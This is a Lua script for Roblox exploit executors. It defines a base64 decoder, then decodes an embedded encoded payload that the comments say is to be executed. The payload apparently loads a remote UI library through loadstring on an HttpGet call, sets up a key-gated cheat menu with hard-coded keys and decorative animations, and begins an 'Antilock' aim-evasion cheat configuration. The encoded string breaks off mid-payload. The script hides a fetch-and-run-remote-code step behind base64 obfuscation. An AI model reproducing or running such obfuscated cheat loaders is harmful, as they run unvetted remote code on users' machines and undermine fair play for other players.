-- Base64 解码器（Roblox 可用）
local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
local b64lookup = {}
for i = 1, #b64chars do
    b64lookup[b64chars:sub(i, i)] = i - 1
end

local function base64_decode(data)
    data = data:gsub('[^%w%+%/%=]', '')
    local result = {}
    local n = 1
    while n <= #data do
        local a = b64lookup[data:sub(n, n)]
        local b = b64lookup[data:sub(n+1, n+1)]
        local c = b64lookup[data:sub(n+2, n+2)]
        local d = b64lookup[data:sub(n+3, n+3)]

        local x = (a * 262144) + (b * 4096) + ((c or 0) * 64) + (d or 0)
        result[#result+1] = string.char(
            math.floor(x / 65536) % 256,
            math.floor(x / 256) % 256,
            x % 256
        )
        n = n + 4
    end

    local pad = select(2, data:gsub('=', '='))
    if pad == 2 then
        result[#result] = result[#result]:sub(1, 1)
    elseif pad == 1 then
        result[#result] = result[#result]:sub(1, 2)
    end

    return table.concat(result)
end

-- ✅ 示例：解码并执行（仅限你自己的脚本）
local decoded = base64_decode("bG9jYWwgUmF5ZmllbGQgPSBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgnaHR0cHM6Ly9zaXJpdXMubWVudS9yYXlmaWVsZCcpKSgpCgotLSDkvb/nlKggUmF5ZmllbGQg5YaF572u5a+G6ZKl57O757ufCmxvY2FsIFdpbmRvdyA9IFJheWZpZWxkOkNyZWF0ZVdpbmRvdyh7CiAgICBOYW1lID0gIuWdpOWdpOWkp+W4neiEmuacrCAtICIgLi4gKGlkZW50aWZ5ZXhlY3V0b3IgYW5kIGlkZW50aWZ5ZXhlY3V0b3IoKSBvciAi5pyq55+l5omn6KGM5ZmoIiksCiAgICBMb2FkaW5nVGl0bGUgPSAi5Z2k5Z2k5aSn5bid6ISa5pys5Yqg6L295LitIiwKICAgIExvYWRpbmdTdWJ0aXRsZSA9ICLlsIrkuqvnibnmnYPniYgiLAogICAgQ29uZmlndXJhdGlvblNhdmluZyA9IHsKICAgICAgICBFbmFibGVkID0gdHJ1ZSwKICAgICAgICBGb2xkZXJOYW1lID0gIlN0aXRjaENvbmZpZyIsCiAgICAgICAgRmlsZU5hbWUgPSAiU2V0dGluZ3MiCiAgICB9LAogICAgRGlzY29yZCA9IHsKICAgICAgICBFbmFibGVkID0gZmFsc2UsCiAgICAgICAgSW52aXRlID0gImh0dHBzOi8vZGlzY29yZC5nZy8iLAogICAgICAgIFJlbWVtYmVySm9pbnMgPSB0cnVlCiAgICB9LAogICAgS2V5U3lzdGVtID0gdHJ1ZSwgLS0g5ZCv55So5YaF572u5a+G6ZKl57O757ufCiAgICBLZXlTZXR0aW5ncyA9IHsKICAgICAgICBUaXRsZSA9ICLlnaTlnaTlpKfluJ3ohJrmnKzpqozor4EiLAogICAgICAgIFN1YnRpdGxlID0gIuivt+i+k+WFpeacieaViOWvhumSpSIsCiAgICAgICAgTm90ZSA9ICLmsqHmnInlr4bpkqXvvJ/liqDlhaVEaXNjb3Jk6I635Y+WIiwKICAgICAgICBGaWxlTmFtZSA9ICJTdGl0Y2hLZXkiLAogICAgICAgIFNhdmVLZXkgPSB0cnVlLAogICAgICAgIEdyYWJLZXlGcm9tU2l0ZSA9IGZhbHNlLAogICAgICAgIEtleSA9IHsiMjAyNSIsICI2NjYiLCAiS1VOS1VONjY2IiwgIjY2NmZyZWUiLCAiVEFJWU9VWUlTSUxFIn0gLS0g5pyJ5pWI5a+G6ZKl5YiX6KGoCiAgICB9Cn0pCgotLSDmmJ/nqbrog4zmma/liqjnlLvns7vnu58KbG9jYWwgZnVuY3Rpb24gQ3JlYXRlU3RhcnJ5QmFja2dyb3VuZEFuaW1hdGlvbigpCiAgICAtLSDliJvlu7rmuJDlj5jog4zmma8KICAgIGxvY2FsIGJnID0gRHJhd2luZy5uZXcoIlNxdWFyZSIpCiAgICBiZy5TaXplID0gd29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuVmlld3BvcnRTaXplCiAgICBiZy5Qb3NpdGlvbiA9IFZlY3RvcjIubmV3KDAsIDApCiAgICBiZy5Db2xvciA9IENvbG9yMy5mcm9tUkdCKDEwLCA1LCAyNSkgIC0tIOa3see0q+iJsuWfuuiwgwogICAgYmcuRmlsbGVkID0gdHJ1ZQogICAgYmcuVHJhbnNwYXJlbmN5ID0gMQogICAgYmcuVmlzaWJsZSA9IHRydWUKICAgIGJnLlpJbmRleCA9IDk5OAogICAgCiAgICAtLSDliJvlu7rmmJ/mmJ/nspLlrZAKICAgIGxvY2FsIHN0YXJzID0ge30KICAgIGxvY2FsIHN0YXJDb3VudCA9IDE1MCAgLS0g5pif5pif5pWw6YePCiAgICAKICAgIGZvciBpID0gMSwgc3RhckNvdW50IGRvCiAgICAgICAgbG9jYWwgc3RhciA9IERyYXdpbmcubmV3KCJDaXJjbGUiKQogICAgICAgIHN0YXIuUG9zaXRpb24gPSBWZWN0b3IyLm5ldygKICAgICAgICAgICAgbWF0aC5yYW5kb20oMCwgd29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuVmlld3BvcnRTaXplLlgpLAogICAgICAgICAgICBtYXRoLnJhbmRvbSgwLCB3b3Jrc3BhY2UuQ3VycmVudENhbWVyYS5WaWV3cG9ydFNpemUuWSkKICAgICAgICApCiAgICAgICAgc3Rhci5SYWRpdXMgPSBtYXRoLnJhbmRvbSgxLCAzKQogICAgICAgIHN0YXIuRmlsbGVkID0gdHJ1ZQogICAgICAgIHN0YXIuVHJhbnNwYXJlbmN5ID0gMQogICAgICAgIHN0YXIuWkluZGV4ID0gOTk5CiAgICAgICAgCiAgICAgICAgLS0g6ZqP5py65pif5pif6aKc6Imy77yI6JOd57Sr6Imy6LCD77yJCiAgICAgICAgbG9jYWwgY29sb3JDaG9pY2UgPSBtYXRoLnJhbmRvbSgxLCAzKQogICAgICAgIGlmIGNvbG9yQ2hvaWNlID09IDEgdGhlbgogICAgICAgICAgICBzdGFyLkNvbG9yID0gQ29sb3IzLmZyb21SR0IoMTAwLCAxNTAsIDI1NSkgIC0tIOiTneiJsgogICAgICAgIGVsc2VpZiBjb2xvckNob2ljZSA9PSAyIHRoZW4KICAgICAgICAgICAgc3Rhci5Db2xvciA9IENvbG9yMy5mcm9tUkdCKDE1MCwgMTAwLCAyNTUpICAtLSDntKvoibIKICAgICAgICBlbHNlCiAgICAgICAgICAgIHN0YXIuQ29sb3IgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KSAgLS0g55m96ImyCiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgdGFibGUuaW5zZXJ0KHN0YXJzLCB7CiAgICAgICAgICAgIGRyYXdpbmcgPSBzdGFyLAogICAgICAgICAgICBzcGVlZCA9IG1hdGgucmFuZG9tKDUwLCAxNTApIC8gMTAwLAogICAgICAgICAgICBwaGFzZSA9IG1hdGgucmFuZG9tKCkgKiBtYXRoLnBpICogMiwKICAgICAgICAgICAgb3JpZ2luYWxSYWRpdXMgPSBzdGFyLlJhZGl1cwogICAgICAgIH0pCiAgICBlbmQKICAgIAogICAgLS0g5Yib5bu65pif5LqR5pWI5p6cCiAgICBsb2NhbCBuZWJ1bGFlID0ge30KICAgIGxvY2FsIG5lYnVsYUNvdW50ID0gOAogICAgCiAgICBmb3IgaSA9IDEsIG5lYnVsYUNvdW50IGRvCiAgICAgICAgbG9jYWwgbmVidWxhID0gRHJhd2luZy5uZXcoIkNpcmNsZSIpCiAgICAgICAgbG9jYWwgc2l6ZSA9IG1hdGgucmFuZG9tKDEwMCwgMzAwKQogICAgICAgIG5lYnVsYS5Qb3NpdGlvbiA9IFZlY3RvcjIubmV3KAogICAgICAgICAgICBtYXRoLnJhbmRvbSgtMTAwLCB3b3Jrc3BhY2UuQ3VycmVudENhbWVyYS5WaWV3cG9ydFNpemUuWCArIDEwMCksCiAgICAgICAgICAgIG1hdGgucmFuZG9tKC0xMDAsIHdvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLlZpZXdwb3J0U2l6ZS5ZICsgMTAwKQogICAgICAgICkKICAgICAgICBuZWJ1bGEuUmFkaXVzID0gc2l6ZQogICAgICAgIG5lYnVsYS5GaWxsZWQgPSB0cnVlCiAgICAgICAgbmVidWxhLlRyYW5zcGFyZW5jeSA9IDEKICAgICAgICBuZWJ1bGEuWkluZGV4ID0gOTk3CiAgICAgICAgCiAgICAgICAgLS0g5pif5LqR6aKc6Imy77yI5rex6JOd57Sr6Imy77yJCiAgICAgICAgbG9jYWwgY29sb3JzID0gewogICAgICAgICAgICBDb2xvcjMuZnJvbVJHQigzMCwgMTUsIDYwKSwKICAgICAgICAgICAgQ29sb3IzLmZyb21SR0IoNDAsIDIwLCA4MCksCiAgICAgICAgICAgIENvbG9yMy5mcm9tUkdCKDI1LCAxMCwgNTApCiAgICAgICAgfQogICAgICAgIG5lYnVsYS5Db2xvciA9IGNvbG9yc1ttYXRoLnJhbmRvbSgxLCAzKV0KICAgICAgICAKICAgICAgICB0YWJsZS5pbnNlcnQobmVidWxhZSwgewogICAgICAgICAgICBkcmF3aW5nID0gbmVidWxhLAogICAgICAgICAgICBtb3ZlU3BlZWQgPSBWZWN0b3IyLm5ldyhtYXRoLnJhbmRvbSgtMTAsIDEwKSAvIDEwMCwgbWF0aC5yYW5kb20oLTEwLCAxMCkgLyAxMDApLAogICAgICAgICAgICBwdWxzZVNwZWVkID0gbWF0aC5yYW5kb20oNSwgMTUpIC8gMTAwLAogICAgICAgICAgICBwaGFzZSA9IG1hdGgucmFuZG9tKCkgKiBtYXRoLnBpICogMgogICAgICAgIH0pCiAgICBlbmQKCiAgICAtLSDlnaTlnaTlpKfluJ3mloflrZcKICAgIGxvY2FsIHRleHQgPSBEcmF3aW5nLm5ldygiVGV4dCIpCiAgICB0ZXh0LlRleHQgPSAi5Z2k5Z2k5aSn5bid6ISa5pysIgogICAgdGV4dC5TaXplID0gMTAwCiAgICB0ZXh0LkNlbnRlciA9IHRydWUKICAgIHRleHQuUG9zaXRpb24gPSBWZWN0b3IyLm5ldyh3b3Jrc3BhY2UuQ3VycmVudENhbWVyYS5WaWV3cG9ydFNpemUuWC8yLCAtMjAwKQogICAgdGV4dC5Db2xvciA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjE1LCAwKSAgLS0g6YeR6Imy5paH5a2XCiAgICB0ZXh0Lk91dGxpbmUgPSB0cnVlCiAgICB0ZXh0Lk91dGxpbmVDb2xvciA9IENvbG9yMy5mcm9tUkdCKDEzOSwgNjksIDE5KSAgLS0g5qOV6Imy5o+P6L65CiAgICB0ZXh0LlRyYW5zcGFyZW5jeSA9IDAKICAgIHRleHQuVmlzaWJsZSA9IHRydWUKICAgIHRleHQuWkluZGV4ID0gMTAwMAogICAgCiAgICAtLSDlia/moIfpopgKICAgIGxvY2FsIHN1YlRleHQgPSBEcmF3aW5nLm5ldygiVGV4dCIpCiAgICBzdWJUZXh0LlRleHQgPSAi5bCK5Lqr54m55p2D54mIIC0g5ZCv5Yqo5oiQ5YqfIgogICAgc3ViVGV4dC5TaXplID0gNDAKICAgIHN1YlRleHQuQ2VudGVyID0gdHJ1ZQogICAgc3ViVGV4dC5Qb3NpdGlvbiA9IFZlY3RvcjIubmV3KHdvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLlZpZXdwb3J0U2l6ZS5YLzIsIC0xMDApCiAgICBzdWJUZXh0LkNvbG9yID0gQ29sb3IzLmZyb21SR0IoMjAwLCAxODAsIDI1NSkgIC0tIOa1hee0q+iJsgogICAgc3ViVGV4dC5PdXRsaW5lID0gdHJ1ZQogICAgc3ViVGV4dC5PdXRsaW5lQ29sb3IgPSBDb2xvcjMuZnJvbVJHQig4MCwgNDAsIDEyMCkKICAgIHN1YlRleHQuVHJhbnNwYXJlbmN5ID0gMAogICAgc3ViVGV4dC5WaXNpYmxlID0gdHJ1ZQogICAgc3ViVGV4dC5aSW5kZXggPSAxMDAwCiAgICAKICAgIC0tIOa1geaYn+aViOaenAogICAgbG9jYWwgbWV0ZW9ycyA9IHt9CiAgICBsb2NhbCBmdW5jdGlvbiBjcmVhdGVNZXRlb3IoKQogICAgICAgIGxvY2FsIG1ldGVvciA9IERyYXdpbmcubmV3KCJMaW5lIikKICAgICAgICBsb2NhbCBzdGFydFggPSBtYXRoLnJhbmRvbSh3b3Jrc3BhY2UuQ3VycmVudENhbWVyYS5WaWV3cG9ydFNpemUuWCArIDEwMCwgd29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuVmlld3BvcnRTaXplLlggKyAzMDApCiAgICAgICAgbG9jYWwgc3RhcnRZID0gbWF0aC5yYW5kb20oLTEwMCwgMjAwKQogICAgICAgIG1ldGVvci5Gcm9tID0gVmVjdG9yMi5uZXcoc3RhcnRYLCBzdGFydFkpCiAgICAgICAgbWV0ZW9yLlRvID0gVmVjdG9yMi5uZXcoc3RhcnRYIC0gMTAwLCBzdGFydFkgKyA0MCkKICAgICAgICBtZXRlb3IuQ29sb3IgPSBDb2xvcjMuZnJvbVJHQigyMDAsIDIyMCwgMjU1KQogICAgICAgIG1ldGVvci5UaGlja25lc3MgPSAyCiAgICAgICAgbWV0ZW9yLlRyYW5zcGFyZW5jeSA9IDAKICAgICAgICBtZXRlb3IuVmlzaWJsZSA9IHRydWUKICAgICAgICBtZXRlb3IuWkluZGV4ID0gOTk5CiAgICAgICAgCiAgICAgICAgdGFibGUuaW5zZXJ0KG1ldGVvcnMsIHsKICAgICAgICAgICAgZHJhd2luZyA9IG1ldGVvciwKICAgICAgICAgICAgcG9zaXRpb24gPSBWZWN0b3IyLm5ldyhzdGFydFgsIHN0YXJ0WSksCiAgICAgICAgICAgIHNwZWVkID0gbWF0aC5yYW5kb20oMzAwLCA2MDApIC8gMTAwLAogICAgICAgICAgICB0cmFpbExlbmd0aCA9IDEwMCwKICAgICAgICAgICAgbGlmZSA9IDEKICAgICAgICB9KQogICAgZW5kCgogICAgLS0g5by55oCn5Yqo55S75Ye95pWwCiAgICBsb2NhbCBmdW5jdGlvbiBlbGFzdGljQW5pbWF0aW9uKG9iaiwgdGFyZ2V0WSwgZHVyYXRpb24pCiAgICAgICAgbG9jYWwgc3RhcnRZID0gb2JqLlBvc2l0aW9uLlkKICAgICAgICBsb2NhbCBzdGFydFRpbWUgPSB0aWNrKCkKICAgICAgICBsb2NhbCBkYW1waW5nID0gMC43CiAgICAgICAgbG9jYWwgc3RpZmZuZXNzID0gMC4zCiAgICAgICAgCiAgICAgICAgbG9jYWwgY29ubmVjdGlvbgogICAgICAgIGNvbm5lY3Rpb24gPSBnYW1lOkdldFNlcnZpY2UoIlJ1blNlcnZpY2UiKS5SZW5kZXJTdGVwcGVkOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICBsb2NhbCBlbGFwc2VkID0gdGljaygpIC0gc3RhcnRUaW1lCiAgICAgICAgICAgIGxvY2FsIHByb2dyZXNzID0gZWxhcHNlZCAvIGR1cmF0aW9uCiAgICAgICAgICAgIAogICAgICAgICAgICBpZiBwcm9ncmVzcyA+PSAxIHRoZW4KICAgICAgICAgICAgICAgIG9iai5Qb3NpdGlvbiA9IFZlY3RvcjIubmV3KG9iai5Qb3NpdGlvbi5YLCB0YXJnZXRZKQogICAgICAgICAgICAgICAgY29ubmVjdGlvbjpEaXNjb25uZWN0KCkKICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIGxvY2FsIG92ZXJzaG9vdCA9IG1hdGguc2luKHByb2dyZXNzICogbWF0aC5waSAqIDQpICogKDEgLSBwcm9ncmVzcykKICAgICAgICAgICAgbG9jYWwgbmV3WSA9IHRhcmdldFkgKyAoc3RhcnRZIC0gdGFyZ2V0WSkgKiBtYXRoLnBvdygxIC0gcHJvZ3Jlc3MsIDIpICogb3ZlcnNob290ICogc3RpZmZuZXNzCiAgICAgICAgICAgIHN0aWZmbmVzcyA9IHN0aWZmbmVzcyAqIGRhbXBpbmcKICAgICAgICAgICAgb2JqLlBvc2l0aW9uID0gVmVjdG9yMi5uZXcob2JqLlBvc2l0aW9uLlgsIG5ld1kpCiAgICAgICAgZW5kKQogICAgZW5kCiAgICAKICAgIHNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAtLSDog4zmma/lkozmmJ/mmJ/mt6HlhaUKICAgICAgICBmb3IgaSA9IDAsIDEsIDAuMDIgZG8KICAgICAgICAgICAgYmcuVHJhbnNwYXJlbmN5ID0gMSAtIGkgKiAwLjkKICAgICAgICAgICAgZm9yIF8sIHN0YXJEYXRhIGluIGlwYWlycyhzdGFycykgZG8KICAgICAgICAgICAgICAgIHN0YXJEYXRhLmRyYXdpbmcuVHJhbnNwYXJlbmN5ID0gMSAtIGkKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGZvciBfLCBuZWJ1bGFEYXRhIGluIGlwYWlycyhuZWJ1bGFlKSBkbwogICAgICAgICAgICAgICAgbmVidWxhRGF0YS5kcmF3aW5nLlRyYW5zcGFyZW5jeSA9IDEgLSBpICogMC43CiAgICAgICAgICAgIGVuZAogICAgICAgICAgICB3YWl0KDAuMDEpCiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgLS0g5Li75qCH6aKY5Yqo55S7CiAgICAgICAgZWxhc3RpY0FuaW1hdGlvbih0ZXh0LCB3b3Jrc3BhY2UuQ3VycmVudENhbWVyYS5WaWV3cG9ydFNpemUuWS8yIC0gMTAwLCAxLjUpCiAgICAgICAgCiAgICAgICAgd2FpdCgwLjIpCiAgICAgICAgCiAgICAgICAgLS0g5Ymv5qCH6aKY5Yqo55S7CiAgICAgICAgZWxhc3RpY0FuaW1hdGlvbihzdWJUZXh0LCB3b3Jrc3BhY2UuQ3VycmVudENhbWVyYS5WaWV3cG9ydFNpemUuWS8yICsgMjAsIDEuMykKICAgICAgICAKICAgICAgICAtLSDlkK/liqjmmJ/mmJ/pl6rng4HlkozmtYHmmJ8KICAgICAgICBsb2NhbCBzdGFydFRpbWUgPSB0aWNrKCkKICAgICAgICBsb2NhbCBtZXRlb3JUaW1lciA9IDAKICAgICAgICAKICAgICAgICB3aGlsZSB0aWNrKCkgLSBzdGFydFRpbWUgPCAzLjUgZG8KICAgICAgICAgICAgbG9jYWwgY3VycmVudFRpbWUgPSB0aWNrKCkKICAgICAgICAgICAgCiAgICAgICAgICAgIC0tIOaYn+aYn+mXqueDgQogICAgICAgICAgICBmb3IgXywgc3RhckRhdGEgaW4gaXBhaXJzKHN0YXJzKSBkbwogICAgICAgICAgICAgICAgbG9jYWwgYWxwaGEgPSAobWF0aC5zaW4oY3VycmVudFRpbWUgKiBzdGFyRGF0YS5zcGVlZCArIHN0YXJEYXRhLnBoYXNlKSArIDEpIC8gMgogICAgICAgICAgICAgICAgc3RhckRhdGEuZHJhd2luZy5UcmFuc3BhcmVuY3kgPSAwLjIgKyBhbHBoYSAqIDAuOAogICAgICAgICAgICAgICAgc3RhckRhdGEuZHJhd2luZy5SYWRpdXMgPSBzdGFyRGF0YS5vcmlnaW5hbFJhZGl1cyAqICgwLjggKyBhbHBoYSAqIDAuNCkKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICAtLSDmmJ/kupHohInliqgKICAgICAgICAgICAgZm9yIF8sIG5lYnVsYURhdGEgaW4gaXBhaXJzKG5lYnVsYWUpIGRvCiAgICAgICAgICAgICAgICBsb2NhbCBwdWxzZSA9IChtYXRoLnNpbihjdXJyZW50VGltZSAqIG5lYnVsYURhdGEucHVsc2VTcGVlZCArIG5lYnVsYURhdGEucGhhc2UpICsgMSkgLyAyCiAgICAgICAgICAgICAgICBuZWJ1bGFEYXRhLmRyYXdpbmcuVHJhbnNwYXJlbmN5ID0gMC4zICsgcHVsc2UgKiAwLjQKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgLS0g57yT5oWi56e75Yqo5pif5LqRCiAgICAgICAgICAgICAgICBuZWJ1bGFEYXRhLmRyYXdpbmcuUG9zaXRpb24gPSBWZWN0b3IyLm5ldygKICAgICAgICAgICAgICAgICAgICBuZWJ1bGFEYXRhLmRyYXdpbmcuUG9zaXRpb24uWCArIG5lYnVsYURhdGEubW92ZVNwZWVkLlgsCiAgICAgICAgICAgICAgICAgICAgbmVidWxhRGF0YS5kcmF3aW5nLlBvc2l0aW9uLlkgKyBuZWJ1bGFEYXRhLm1vdmVTcGVlZC5ZCiAgICAgICAgICAgICAgICApCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgLS0g5rWB5pif55Sf5oiQCiAgICAgICAgICAgIG1ldGVvclRpbWVyID0gbWV0ZW9yVGltZXIgKyB3YWl0KCkKICAgICAgICAgICAgaWYgbWV0ZW9yVGltZXIgPiAwLjggYW5kIG1hdGgucmFuZG9tKCkgPCAwLjMgdGhlbgogICAgICAgICAgICAgICAgY3JlYXRlTWV0ZW9yKCkKICAgICAgICAgICAgICAgIG1ldGVvclRpbWVyID0gMAogICAgICAgICAgICBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIC0tIOabtOaWsOa1geaYnwogICAgICAgICAgICBmb3IgaSA9ICNtZXRlb3JzLCAxLCAtMSBkbwogICAgICAgICAgICAgICAgbG9jYWwgbWV0ZW9yID0gbWV0ZW9yc1tpXQogICAgICAgICAgICAgICAgbWV0ZW9yLmxpZmUgPSBtZXRlb3IubGlmZSAtIDAuMDIKICAgICAgICAgICAgICAgIG1ldGVvci5wb3NpdGlvbiA9IFZlY3RvcjIubmV3KAogICAgICAgICAgICAgICAgICAgIG1ldGVvci5wb3NpdGlvbi5YIC0gbWV0ZW9yLnNwZWVkLAogICAgICAgICAgICAgICAgICAgIG1ldGVvci5wb3NpdGlvbi5ZICsgbWV0ZW9yLnNwZWVkICogMC40CiAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIG1ldGVvci5kcmF3aW5nLkZyb20gPSBtZXRlb3IucG9zaXRpb24KICAgICAgICAgICAgICAgIG1ldGVvci5kcmF3aW5nLlRvID0gVmVjdG9yMi5uZXcoCiAgICAgICAgICAgICAgICAgICAgbWV0ZW9yLnBvc2l0aW9uLlggLSBtZXRlb3IudHJhaWxMZW5ndGgsCiAgICAgICAgICAgICAgICAgICAgbWV0ZW9yLnBvc2l0aW9uLlkgKyBtZXRlb3IudHJhaWxMZW5ndGggKiAwLjQKICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgICAgIG1ldGVvci5kcmF3aW5nLlRyYW5zcGFyZW5jeSA9IDEgLSBtZXRlb3IubGlmZQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpZiBtZXRlb3IubGlmZSA8PSAwIG9yIG1ldGVvci5wb3NpdGlvbi5YIDwgLTIwMCB0aGVuCiAgICAgICAgICAgICAgICAgICAgbWV0ZW9yLmRyYXdpbmc6UmVtb3ZlKCkKICAgICAgICAgICAgICAgICAgICB0YWJsZS5yZW1vdmUobWV0ZW9ycywgaSkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIHdhaXQoMC4wMykKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICAtLSDmt6Hlh7rliqjnlLsKICAgICAgICBmb3IgaSA9IDAsIDEsIDAuMDMgZG8KICAgICAgICAgICAgdGV4dC5UcmFuc3BhcmVuY3kgPSBpCiAgICAgICAgICAgIHN1YlRleHQuVHJhbnNwYXJlbmN5ID0gaQogICAgICAgICAgICBiZy5UcmFuc3BhcmVuY3kgPSAwLjEgKyBpICogMC45CiAgICAgICAgICAgIAogICAgICAgICAgICBmb3IgXywgc3RhckRhdGEgaW4gaXBhaXJzKHN0YXJzKSBkbwogICAgICAgICAgICAgICAgc3RhckRhdGEuZHJhd2luZy5UcmFuc3BhcmVuY3kgPSBpCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgZm9yIF8sIG5lYnVsYURhdGEgaW4gaXBhaXJzKG5lYnVsYWUpIGRvCiAgICAgICAgICAgICAgICBuZWJ1bGFEYXRhLmRyYXdpbmcuVHJhbnNwYXJlbmN5ID0gaQogICAgICAgICAgICBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIGZvciBfLCBtZXRlb3IgaW4gaXBhaXJzKG1ldGVvcnMpIGRvCiAgICAgICAgICAgICAgICBtZXRlb3IuZHJhd2luZy5UcmFuc3BhcmVuY3kgPSBpCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgd2FpdCgwLjAxKQogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIC0tIOa4heeQhgogICAgICAgIGJnOlJlbW92ZSgpCiAgICAgICAgdGV4dDpSZW1vdmUoKQogICAgICAgIHN1YlRleHQ6UmVtb3ZlKCkKICAgICAgICAKICAgICAgICBmb3IgXywgc3RhckRhdGEgaW4gaXBhaXJzKHN0YXJzKSBkbwogICAgICAgICAgICBzdGFyRGF0YS5kcmF3aW5nOlJlbW92ZSgpCiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgZm9yIF8sIG5lYnVsYURhdGEgaW4gaXBhaXJzKG5lYnVsYWUpIGRvCiAgICAgICAgICAgIG5lYnVsYURhdGEuZHJhd2luZzpSZW1vdmUoKQogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIGZvciBfLCBtZXRlb3IgaW4gaXBhaXJzKG1ldGVvcnMpIGRvCiAgICAgICAgICAgIG1ldGVvci5kcmF3aW5nOlJlbW92ZSgpCiAgICAgICAgZW5kCiAgICBlbmQpCmVuZAoKLS0g5aSN5Yi25Yiw5Ymq6LS05p2/5Ye95pWwCmxvY2FsIGZ1bmN0aW9uIENvcHlUb0NsaXBib2FyZCh0ZXh0KQogICAgaWYgc2V0Y2xpcGJvYXJkIHRoZW4KICAgICAgICBzZXRjbGlwYm9hcmQodGV4dCkKICAgICAgICByZXR1cm4gdHJ1ZQogICAgZWxzZWlmIHdyaXRlY2xpcGJvYXJkIHRoZW4KICAgICAgICB3cml0ZWNsaXBib2FyZCh0ZXh0KQogICAgICAgIHJldHVybiB0cnVlCiAgICBlbHNlaWYgdG9jbGlwYm9hcmQgdGhlbgogICAgICAgIHRvY2xpcGJvYXJkKHRleHQpCiAgICAgICAgcmV0dXJuIHRydWUKICAgIGVsc2UKICAgICAgICBwcmludCgiW+WkjeWItuWGheWuuV0gIiAuLiB0ZXh0KQogICAgICAgIHJldHVybiBmYWxzZQogICAgZW5kCmVuZAoKLS0g5pi+56S65aSN5Yi25oiQ5Yqf6YCa55+lCmxvY2FsIGZ1bmN0aW9uIFNob3dDb3B5Tm90aWZpY2F0aW9uKHN1Y2Nlc3MsIGNvbnRlbnQpCiAgICBpZiBzdWNjZXNzIHRoZW4KICAgICAgICBSYXlmaWVsZDpOb3RpZnkoewogICAgICAgICAgICBUaXRsZSA9ICLlpI3liLbmiJDlip8iLAogICAgICAgICAgICBDb250ZW50ID0gIuW3suWkjeWItuWIsOWJqui0tOadvzogIiAuLiBjb250ZW50LAogICAgICAgICAgICBEdXJhdGlvbiA9IDMsCiAgICAgICAgICAgIEltYWdlID0gNDQ4MzM2MjQ1OAogICAgICAgIH0pCiAgICBlbHNlCiAgICAgICAgUmF5ZmllbGQ6Tm90aWZ5KHsKICAgICAgICAgICAgVGl0bGUgPSAi5aSN5Yi25aSx6LSlIiwKICAgICAgICAgICAgQ29udGVudCA9ICLor7fmiYvliqjlpI3liLbmjqfliLblj7DkuK3nmoTlhoXlrrkiLAogICAgICAgICAgICBEdXJhdGlvbiA9IDUsCiAgICAgICAgICAgIEltYWdlID0gNDQ4MzM2MjQ1OAogICAgICAgIH0pCiAgICBlbmQKZW5kCgotLSA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQotLSDpgJrnlKhBbnRpbG9ja+iEmuacrCAtIOmAgumFjeaJgOacieacjeWKoeWZqAotLSA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQpsb2NhbCBQbGF5ZXJzID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikKbG9jYWwgUnVuU2VydmljZSA9IGdhbWU6R2V0U2VydmljZSgiUnVuU2VydmljZSIpCmxvY2FsIFVzZXJJbnB1dFNlcnZpY2UgPSBnYW1lOkdldFNlcnZpY2UoIlVzZXJJbnB1dFNlcnZpY2UiKQpsb2NhbCBMb2NhbFBsYXllciA9IFBsYXllcnMuTG9jYWxQbGF5ZXIKbG9jYWwgQ2FtZXJhID0gd29ya3NwYWNlLkN1cnJlbnRDYW1lcmEKCi0tIEFudGlsb2Nr6YWN572uCmxvY2FsIEFudGlsb2NrID0gewogICAgRW5hYmxlZCA9IGZhbHNlLAogICAgTW9kZSA9ICJEZWZhdWx0IiwgLS0gRGVmYXVsdCwgQWR2YW5jZWQsIEN1c3RvbQogICAgU3RyZW5ndGggPSAxLjAsCiAgICBTcGVlZCA9IDEuMCwKICAgIFByZWRpY3Rpb24gPSAwLjEsCiAgICBIdW1hbml6ZXIgPSB0cnVlLAogICAgCiAgICAtLSDpq5jnuqforr7nva4KICAgIEFkdmFuY2VkID0gewogICAgICAgIEppdHRlciA9IDAuMDUsCiAgICAgICAgUmFuZG9taXphdGlvbiA9IDAuMSwKICAgICAgICBQYXR0ZXJuID0gIkNpcmN1bGFyIiwgLS0gQ2lyY3VsYXIsIFppZ3phZywgUmFuZG9tLCBMaW5lYXIKICAgICAgICBBZGFwdGl2ZSA9IHRydWUKICAgIH0sCiAgICAKICAgIC0tIO